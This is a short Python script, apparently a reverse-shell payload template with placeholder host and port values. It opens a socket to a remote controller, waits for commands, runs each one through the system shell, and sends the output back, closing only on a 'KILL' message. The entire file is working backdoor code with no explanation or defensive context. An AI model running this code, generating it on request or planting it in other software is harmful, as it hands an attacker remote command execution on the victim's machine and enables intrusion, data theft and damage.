import socket
import subprocess
HOST, PORT = '{HOST}' , int({PORT})
recv_buffer = int(1024)
def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    while True:
        command = s.recv(recv_buffer)
        if 'KILL' in command.decode():
            s.close()
            raise SystemExit
        elif(command.decode() == 'clearstr'):
            s.sendall('~'.encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.sendall(CMD.stdout.read())
if __name__ == '__main__':
    main()